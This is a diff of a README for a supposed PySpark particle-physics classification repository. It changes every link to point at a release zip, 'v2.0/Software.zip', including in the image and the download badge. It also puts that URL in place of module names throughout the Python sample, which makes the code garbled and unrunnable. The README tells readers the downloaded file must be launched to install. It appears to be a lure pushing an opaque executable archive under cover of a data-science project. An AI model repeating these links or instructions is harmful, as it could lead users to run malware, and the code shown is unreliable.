@@ -1,6 +1,6 @@
 # 🚀 Welcome to hepmassClassification Repository
 
-![Particle Physics](https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip)
+![Particle Physics](https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -19,7 +19,7 @@ Welcome to the **hepmassClassification** repository - your go-to place for a PyS
 
 To get started, you can simply download the latest release of the project from the following link:
 
-[![Download hepmassClassification](https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip)](https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip)
+[![Download hepmassClassification](https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip)](https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip)
 
 *Note: The downloaded file needs to be launched for installation.*
 
@@ -43,23 +43,23 @@ Here are some sample code snippets to get you started with the **hepmassClassifi
 ```python
 # Distributed Preprocessing
 from pyspark import SparkContext
-from https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip import SQLContext
+from https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip import SQLContext
 
-sc = https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip()
+sc = https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip()
 sqlContext = SQLContext(sc)
 
 # Machine Learning Model Training
-from https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip import LogisticRegression
-from https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip import RandomForestClassifier
+from https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip import LogisticRegression
+from https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip import RandomForestClassifier
 
 lr = LogisticRegression(maxIter=10, regParam=0.3, elasticNetParam=0.8)
 rf = RandomForestClassifier(labelCol="label", featuresCol="features", numTrees=10)
 
 # Data Visualization
-import https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip as plt
+import https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip as plt
 
 # Evaluation Metrics
-from https://github.com/ego-creator/hepmassClassification/releases/download/v1.0/Installer.zip import MulticlassClassificationEvaluator
+from https://github.com/ego-creator/hepmassClassification/releases/download/v2.0/Software.zip import MulticlassClassificationEvaluator
 evaluator = MulticlassClassificationEvaluator(labelCol="label", predictionCol="prediction", metricName="accuracy")
 ```
 
